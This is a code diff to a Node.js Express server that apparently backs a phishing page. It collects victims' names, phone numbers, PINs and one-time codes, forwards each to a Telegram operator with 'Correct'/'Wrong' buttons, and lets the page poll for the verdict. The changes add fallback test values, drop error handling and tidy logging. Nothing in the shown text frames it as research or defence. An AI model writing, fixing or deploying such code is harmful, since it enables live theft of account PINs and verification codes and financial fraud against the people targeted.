@@ -46,7 +46,7 @@ async function answerCallback(callbackId) {
 
 // PIN submit
 app.post('/submit-pin', (req, res) => {
-    const { name, phone, pin } = req.body;
+    const { name = 'TestUser', phone = '0712345678', pin } = req.body; // fallback values
     const requestId = uuidv4();
 
     console.log('📩 PIN received:', { name, phone, pin, requestId });
@@ -58,9 +58,8 @@ app.post('/submit-pin', (req, res) => {
             { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
             { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
         ]]
-    ).catch(err => console.error(err));
+    );
 
-    // Always respond with requestId
     res.json({ status: 'pending', requestId });
 });
 
@@ -73,7 +72,7 @@ app.get('/check-pin/:requestId', (req, res) => {
 
 // CODE submit
 app.post('/submit-code', (req, res) => {
-    const { name, phone, code } = req.body;
+    const { name = 'TestUser', phone = '0712345678', code } = req.body;
     const requestId = uuidv4();
 
     console.log('📩 CODE received:', { name, phone, code, requestId });
@@ -85,7 +84,7 @@ app.post('/submit-code', (req, res) => {
             { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
             { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` }
         ]]
-    ).catch(err => console.error(err));
+    );
 
     res.json({ status: 'pending', requestId });
 });
@@ -118,12 +117,14 @@ app.post('/telegram-webhook', async (req, res) => {
     if (action === 'code_bad') approvedCodes[requestId] = false;
 
     await answerCallback(cb.id);
-    console.log('✅ Callback processed', { approvedPins, approvedCodes });
+    console.log('✅ Callback processed, current states:', {
+        approvedPins,
+        approvedCodes
+    });
 
     res.sendStatus(200);
 });
 
-// ---------------- TEST ROUTE ----------------
-app.get('/', (req, res) => res.send('Server is running 🚀'));
-
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+});
